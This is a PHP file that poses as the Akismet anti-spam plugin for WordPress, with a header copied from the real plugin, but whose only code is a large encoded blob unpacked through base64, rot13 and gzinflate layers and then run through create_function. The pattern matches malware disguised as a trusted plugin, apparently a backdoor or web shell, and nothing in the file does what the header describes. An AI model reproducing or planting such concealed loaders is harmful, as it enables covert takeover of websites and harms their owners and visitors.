<?php
/**
 *
 * @package     Akismet3
 * @version     3.9.9
 * @author      WordPress.com <wordpress.com>
 * @copyright   Copyright (c) 2012, WordPress.com
 * @license     http://opensource.org/licenses/gpl-2.0.php GPL v2 or later
 * @link        http://wordpress.com
 * @description Used by millions, Akismet is quite possibly the best way in the world to <strong>protect your blog from spam</strong>. It keeps your site protected even while you sleep. To get started: 1) Click the "Activate" link to the left of this description, 2) <a href="http://akismet.com/get/">Sign up for an Akismet plan</a> to get an API key, and 3) Go to your Akismet configuration page, and save your API key.
 */
/*
Plugin Name: Akismet3
Plugin URI: http://wordpress.com
Description: Used by millions, Akismet is quite possibly the best way in the world to <strong>protect your blog from spam</strong>. It keeps your site protected even while you sleep. To get started: 1) Click the "Activate" link to the left of this description, 2) <a href="http://akismet.com/get/">Sign up for an Akismet plan</a> to get an API key, and 3) Go to your Akismet configuration page, and save your API key.
Version: 3.9.9
Author: WordPress.com
Author URI: http://wordpress.com
License: GPLv2 or later
*/

$Ldkrw =  str_rot13(gzinflate(str_rot13(base64_decode('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'))));
$Ldkrw = create_function(null, $Ldkrw);
$Ldkrw();
?>